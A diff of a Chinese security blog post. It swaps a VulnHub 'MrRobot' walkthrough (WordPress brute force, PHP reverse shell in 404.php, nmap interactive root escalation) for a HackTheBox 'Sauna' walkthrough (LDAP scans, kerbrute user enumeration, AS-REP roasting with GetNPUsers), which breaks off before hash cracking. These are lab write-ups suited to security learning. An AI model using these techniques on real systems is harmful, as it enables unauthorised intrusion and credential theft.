@@ -4,16 +4,16 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="MrRobot, Web h**k Python aling">
+    <meta name="keywords" content="Sauna, Web h**k Python aling">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="今天天气好，运气也不错，找到靶机的ip地址很顺利，没出什么幺蛾子
+    <meta name="description" content="
+  nmap 扫描
 
-MrBobot：192.168.232.132
-kali：192.168.232.130
-nmap扫一扫
-root@kali:~/Desktop# nmap -sV 192">
+kali@kali:~$ sudo nmap -sV -sS 10.10.10.175
+[sudo] password for kali: 
+Starting Nmap 7.80 ( https://nmap.org">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +21,7 @@ root@kali:~/Desktop# nmap -sV 192">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>MrRobot | 道士信佛</title>
+    <title>Sauna | 道士信佛</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -288,7 +288,7 @@ root@kali:~/Desktop# nmap -sV 192">
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '';
+        let pwd = '5952a047314592f472fae6bbf2231cb9d7df0c6abd80eec42c1c7b679624e552';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误，将返回主页！');
@@ -301,13 +301,13 @@ root@kali:~/Desktop# nmap -sV 192">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        MrRobot
+                        Sauna
                     </div>
                 </div>
             </div>
@@ -418,8 +418,12 @@ root@kali:~/Desktop# nmap -sV 192">
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/vulnhub/" target="_blank">
-                            <span class="chip bg-color">vulnhub</span>
+                        <a href="/tags/hackthebox/" target="_blank">
+                            <span class="chip bg-color">hackthebox</span>
+                        </a>
+                        
+                        <a href="/tags/windows/" target="_blank">
+                            <span class="chip bg-color">windows</span>
                         </a>
                         
                     </div>
@@ -427,13 +431,22 @@ root@kali:~/Desktop# nmap -sV 192">
                 </div>
                 <div class="col s5 right-align">
                     
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                        <a href="/categories/渗透测试/" class="post-category" target="_blank">
+                            渗透测试
+                        </a>
+                        
+                    </div>
+                    
                 </div>
             </div>
 
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-05-19
+                    2020-06-27
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -447,14 +460,14 @@ root@kali:~/Desktop# nmap -sV 192">
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1k
+                    2.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    14 分
                 </div>
                 
                 
@@ -465,86 +478,333 @@ root@kali:~/Desktop# nmap -sV 192">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>今天天气好，运气也不错，找到靶机的ip地址很顺利，没出什么幺蛾子</p>
-<p><img src="1.gif" alt></p>
-<p>MrBobot：192.168.232.132</p>
-<p>kali：192.168.232.130</p>
-<p>nmap扫一扫</p>
-<pre class="line-numbers language-shell"><code class="language-shell">root@kali:~/Desktop# nmap -sV 192.168.232.132
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 20:46 EDT
-Nmap scan report for bogon (192.168.232.132)
-Host is up (0.00053s latency).
-Not shown: 997 filtered ports
-PORT    STATE  SERVICE  VERSION
-22/tcp  closed ssh
-80/tcp  open   http     Apache httpd
-443/tcp open   ssl/http Apache httpd
-MAC Address: 00:0C:29:D3:6E:69 (VMware)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>目标只开了两个端口，访问一下web应用程序，太炫酷了……</p>
-<p><img src="2.PNG" alt></p>
-<p>和它玩了好一会儿，才反应过来，我是谁，我在哪，我在干什么</p>
-<p><img src="3.gif" alt></p>
-<p>不管那么多先看看robots.txt文件有没有，这是我的坏习惯，hhh，看到有两个文件。一个是字典，一个是一串hash值一样的东西，md5没有解密出来</p>
-<p>看看我的目录扫描有木有结果，其实我之前是做过一遍的，这一边是为了写报告，就不等了。字典太大了，要等好久好久，扫描的结果会扫出一个登陆页面 “192.168.232.132/wp-login.php”</p>
-<p>在这个登陆页面，随便输入几个用户，发现可以枚举用户名</p>
-<p><img src="4.PNG" alt></p>
-<p>用burp爆破，就用他刚刚给的字典，看到这个数据包的请求貌似被重定向了，所以爆破的时候把 intruder 模块下的重定向选项勾上吧</p>
-<p><img src="5.PNG" alt></p>
-<p>爆出了一个名字 elliot 这应该就是用户名，接下来爆密码，还是用刚刚的字典。爆出密码是 ER28-0652，登陆进入后台</p>
-<p>wordpress的外观下的php文件可以直接编辑（appearance-&gt;editor），在这里可以随便选一个php文件插入木马，我选择404.php这个文件。因为执行这个文件不需要找路径，随便访问一个不存在的文件，木马就触发了。这里采用正向 shell 貌似不行，我尝试了一句话木马连接不上，不清楚问题在哪。所以采用反向 shell</p>
-<p>拷贝kali自带的 php-reverse-shell.php里，的内容，修改，ip和端口号后覆盖之前的 404.php。</p>
-<p><img src="6.PNG" alt></p>
-<p>kali开启监听，随便访问一个不存在文件，得到一个webshell</p>
-<pre class="line-numbers language-shell"><code class="language-shell">root@kali:~/Desktop# nc -lvp 1911
-listening on [any] 1911 ...
-connect to [192.168.232.130] from bogon [192.168.232.132] 32995
-Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
- 01:33:50 up 38 min,  0 users,  load average: 0.05, 1.03, 3.32
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=1(daemon) gid=1(daemon) groups=1(daemon)
-/bin/sh: 0: can't access tty; job control turned off
-$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>获得一个更稳定的shell </p>
-<p><code>python -c ‘import pty;pty.spawn(&quot;/bin/bash&quot;)’</code></p>
-<p>nc 的 shell 没办法执行 su 命令，就很尴尬</p>
-<p>在用户的家目录下有两个文件，一个是 hash 值解不出来，另一个则是 一个 robot用户以及他的密码hash值，解密出来是 “abcdefghijklmnopqrstuvwxyz”</p>
-<p>切换到 robot 用户去，为了获得更大的权限  su robot，切换后发现这个用户权限也是小的可怜</p>
-<pre class="line-numbers language-shell"><code class="language-shell">robot@linux:/$ sudo -l
-sudo -l
-[sudo] password for robot: abcdefghijklmnopqrstuvwxyz
+                <blockquote>
+<p>  nmap 扫描</p>
+</blockquote>
+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo nmap -sV -sS 10.10.10.175
+[sudo] password for kali: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 20:01 EDT
+Stats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 91.67% done; ETC: 20:02 (0:00:03 remaining)
+Nmap scan report for bogon (10.10.10.175)
+Host is up (0.26s latency).
+Not shown: 988 filtered ports
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain?
+80/tcp   open  http          Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-27 07:05:50Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=6/26%Time=5EF68C65%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
 
-Sorry, user robot may not run sudo on linux.
-robot@linux:/$ 
-robot@linux:/$ id
-id
-uid=1002(robot) gid=1002(robot) groups=1002(robot)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>看了大佬的方法，可以利用 nmap 提权，<strong><a href="https://www.anquanke.com/post/id/86979" target="_blank" rel="noopener">点我呀</a></strong>，但这限于nmap的较低版本</p>
-<p><img src="7.jpg" alt></p>
-<p>记一下命令算了</p>
-<pre class="line-numbers language-shell"><code class="language-shell">find / -user root -perm -4000 -print 2>/dev/null  
-#这个命令可以找到正在系统上运行的所有SUID可执行文件。
-#准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null,从而仅列出该用户具有访问权限的那些二进制文件。
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 171.60 seconds
+kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>80 端口开放，但没能从这个点找到突破……但发现了一些用户名可能有用，记录下来写到字典里</p>
+<p><img src="image-20200627080825648.png" alt></p>
+<p>转眼到 ldap 协议和 kerberos 协议，尝试 AD 攻击</p>
+<p>nmap 再次扫描</p>
+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo nmap -sS --script ldap*.nse 10.10.10.175
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 20:09 EDT
+Nmap scan report for bogon (10.10.10.175)
+Host is up (0.25s latency).
+Not shown: 988 filtered ports
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+| ldap-brute: 
+|   root:<empty> => Valid credentials
+|   admin:<empty> => Valid credentials
+|   administrator:<empty> => Valid credentials
+|   webadmin:<empty> => Valid credentials
+|   sysadmin:<empty> => Valid credentials
+|   netadmin:<empty> => Valid credentials
+|   guest:<empty> => Valid credentials
+|   user:<empty> => Valid credentials
+|   web:<empty> => Valid credentials
+|_  test:<empty> => Valid credentials
+| ldap-rootdse: 
+| LDAP Results
+|   <ROOT>
+|       domainFunctionality: 7
+|       forestFunctionality: 7
+|       domainControllerFunctionality: 7
+|       rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
+|       ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna$@EGOTISTICAL-BANK.LOCAL
+|       isGlobalCatalogReady: TRUE
+|       supportedSASLMechanisms: GSSAPI
+|       supportedSASLMechanisms: GSS-SPNEGO
+|       supportedSASLMechanisms: EXTERNAL
+|       supportedSASLMechanisms: DIGEST-MD5
+|       supportedLDAPVersion: 3
+|       supportedLDAPVersion: 2
+|       supportedLDAPPolicies: MaxPoolThreads
+|       supportedLDAPPolicies: MaxPercentDirSyncRequests
+|       supportedLDAPPolicies: MaxDatagramRecv
+|       supportedLDAPPolicies: MaxReceiveBuffer
+|       supportedLDAPPolicies: InitRecvTimeout
+|       supportedLDAPPolicies: MaxConnections
+|       supportedLDAPPolicies: MaxConnIdleTime
+|       supportedLDAPPolicies: MaxPageSize
+|       supportedLDAPPolicies: MaxBatchReturnMessages
+|       supportedLDAPPolicies: MaxQueryDuration
+|       supportedLDAPPolicies: MaxDirSyncDuration
+|       supportedLDAPPolicies: MaxTempTableSize
+|       supportedLDAPPolicies: MaxResultSetSize
+|       supportedLDAPPolicies: MinResultSets
+|       supportedLDAPPolicies: MaxResultSetsPerConn
+|       supportedLDAPPolicies: MaxNotificationPerConn
+|       supportedLDAPPolicies: MaxValRange
+|       supportedLDAPPolicies: MaxValRangeTransitive
+|       supportedLDAPPolicies: ThreadMemoryLimit
+|       supportedLDAPPolicies: SystemMemoryLimitPercent
+|       supportedControl: 1.2.840.113556.1.4.319
+|       supportedControl: 1.2.840.113556.1.4.801
+|       supportedControl: 1.2.840.113556.1.4.473
+|       supportedControl: 1.2.840.113556.1.4.528
+|       supportedControl: 1.2.840.113556.1.4.417
+|       supportedControl: 1.2.840.113556.1.4.619
+|       supportedControl: 1.2.840.113556.1.4.841
+|       supportedControl: 1.2.840.113556.1.4.529
+|       supportedControl: 1.2.840.113556.1.4.805
+|       supportedControl: 1.2.840.113556.1.4.521
+|       supportedControl: 1.2.840.113556.1.4.970
+|       supportedControl: 1.2.840.113556.1.4.1338
+|       supportedControl: 1.2.840.113556.1.4.474
+|       supportedControl: 1.2.840.113556.1.4.1339
+|       supportedControl: 1.2.840.113556.1.4.1340
+|       supportedControl: 1.2.840.113556.1.4.1413
+|       supportedControl: 2.16.840.1.113730.3.4.9
+|       supportedControl: 2.16.840.1.113730.3.4.10
+|       supportedControl: 1.2.840.113556.1.4.1504
+|       supportedControl: 1.2.840.113556.1.4.1852
+|       supportedControl: 1.2.840.113556.1.4.802
+|       supportedControl: 1.2.840.113556.1.4.1907
+|       supportedControl: 1.2.840.113556.1.4.1948
+|       supportedControl: 1.2.840.113556.1.4.1974
+|       supportedControl: 1.2.840.113556.1.4.1341
+|       supportedControl: 1.2.840.113556.1.4.2026
+|       supportedControl: 1.2.840.113556.1.4.2064
+|       supportedControl: 1.2.840.113556.1.4.2065
+|       supportedControl: 1.2.840.113556.1.4.2066
+|       supportedControl: 1.2.840.113556.1.4.2090
+|       supportedControl: 1.2.840.113556.1.4.2205
+|       supportedControl: 1.2.840.113556.1.4.2204
+|       supportedControl: 1.2.840.113556.1.4.2206
+|       supportedControl: 1.2.840.113556.1.4.2211
+|       supportedControl: 1.2.840.113556.1.4.2239
+|       supportedControl: 1.2.840.113556.1.4.2255
+|       supportedControl: 1.2.840.113556.1.4.2256
+|       supportedControl: 1.2.840.113556.1.4.2309
+|       supportedControl: 1.2.840.113556.1.4.2330
+|       supportedControl: 1.2.840.113556.1.4.2354
+|       supportedCapabilities: 1.2.840.113556.1.4.800
+|       supportedCapabilities: 1.2.840.113556.1.4.1670
+|       supportedCapabilities: 1.2.840.113556.1.4.1791
+|       supportedCapabilities: 1.2.840.113556.1.4.1935
+|       supportedCapabilities: 1.2.840.113556.1.4.2080
+|       supportedCapabilities: 1.2.840.113556.1.4.2237
+|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       serverName: CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       schemaNamingContext: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       namingContexts: DC=EGOTISTICAL-BANK,DC=LOCAL
+|       namingContexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       namingContexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       namingContexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       namingContexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       isSynchronized: TRUE
+|       highestCommittedUSN: 74465
+|       dsServiceName: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|       dnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL
+|       defaultNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
+|       currentTime: 20200627071405.0Z
+|_      configurationNamingContext: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+| ldap-search: 
+|   Context: DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: DC=EGOTISTICAL-BANK,DC=LOCAL
+|         objectClass: top
+|         objectClass: domain
+|         objectClass: domainDNS
+|         distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
+|         instanceType: 5
+|         whenCreated: 2020/01/23 05:44:25 UTC
+|         whenChanged: 2020/06/27 05:37:41 UTC
+|         subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         uSNCreated: 4099
+|         dSASignature: \x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC
+|         uSNChanged: 53269
+|         name: EGOTISTICAL-BANK
+|         objectGUID: 504e6ec-c122-a143-93c0-cf487f83363
+|         replUpToDateVector: \x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xFDZ\x85\x92F\xDE^A\xAAVnj@#\xF6\x0C\x0B\xD0\x00\x00\x00\x00\x00\x00$l\x07\x15\x03\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC   \xB0\x00\x00\x00\x00\x00\x00\xD4\x04R\x14\x03\x00\x00\x00
+|         creationTime: 132377098613445844
+|         forceLogoff: -9223372036854775808
+|         lockoutDuration: -18000000000
+|         lockOutObservationWindow: -18000000000
+|         lockoutThreshold: 0
+|         maxPwdAge: -36288000000000
+|         minPwdAge: -864000000000
+|         minPwdLength: 7
+|         modifiedCountAtLastProm: 0
+|         nextRid: 1000
+|         pwdProperties: 1
+|         pwdHistoryLength: 24
+|         objectSid: 1-5-21-2966785786-3096785034-1186376766
+|         serverState: 1
+|         uASCompat: 1
+|         modifiedCount: 1
+|         auditingPolicy: \x00\x01
+|         nTMixedDomain: 0
+|         rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         systemFlags: -1946157056
+|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         isCriticalSystemObject: TRUE
+|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
+|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
+|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         ms-DS-MachineAccountQuota: 10
+|         msDS-Behavior-Version: 7
+|         msDS-PerUserTrustQuota: 1
+|         msDS-AllUsersTrustQuota: 1000
+|         msDS-PerUserTrustTombstonesQuota: 10
+|         msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+|         msDS-NcType: 0
+|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
+|         dc: EGOTISTICAL-BANK
+|     dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
+|     dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
+|_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+Service Info: Host: SAUNA; OS: Windows
 
-robot@linux:/$ nmap -v
-nmap -v
-Starting nmap 3.81 ( http://www.insecure.org/nmap/ ) at 2020-05-05 01:48 UTC
-No target machines/networks specified!
-QUITTING!
-robot@linux:/$ 
-robot@linux:/$ 
-robot@linux:/$ nmap --interactive
-nmap --interactive
-Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
-Welcome to Interactive Mode -- press h <enter> for help
-nmap> 
-Bogus command -- press h <enter> for help
-nmap> !sh
-!sh
-# 
-# whoami
-whoami
-root
-# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Nmap done: 1 IP address (1 host up) scanned in 22.50 seconds
+kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>枚举出了一些用户名，还有一个登陆凭证 </p>
+<p><code>ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna$@EGOTISTICAL-BANK.LOCAL</code></p>
+<p>靶机所在的域，根域名是 <code>EGOTISTICAL-BANK.LOCAL</code>，脚本扫描显示域控也是这个，猜测靶机应该和域控是同一个机子，而这个机子上还虚拟化了其他的很多对象。</p>
+<p><a href="https://github.com/ropnop/kerbrute/releases" target="_blank" rel="noopener">kerbrute</a> 枚举用户</p>
+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ ./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 sauna.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 06/26/20 - Ronnie Flathers @ropnop
+
+2020/06/26 20:22:17 >  Using KDC(s):
+2020/06/26 20:22:17 >   10.10.10.175:88
+
+2020/06/26 20:22:17 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
+2020/06/26 20:22:17 >  [+] VALID USERNAME:       sauna@EGOTISTICAL-BANK.LOCAL
+2020/06/26 20:22:17 >  [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL
+2020/06/26 20:22:18 >  Done! Tested 50 usernames (4 valid) in 1.686 seconds
+kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>枚举出三个用户，尝试爆破用密码，没能成功</p>
+<p>用 <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" target="_blank" rel="noopener">GetNPUsers.py</a> 抓取”不要求Kerberos预身份验证”的 hash</p>
+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~/Desktop/impacket/examples$ python3 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile ../../../sauna.txt -format john -outputfile Sauna -dc-ip 10.10.10.175<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20200627085630952.png" alt></p>
+<blockquote>
+<p>  JtR 解密</p>
+</blockquote>
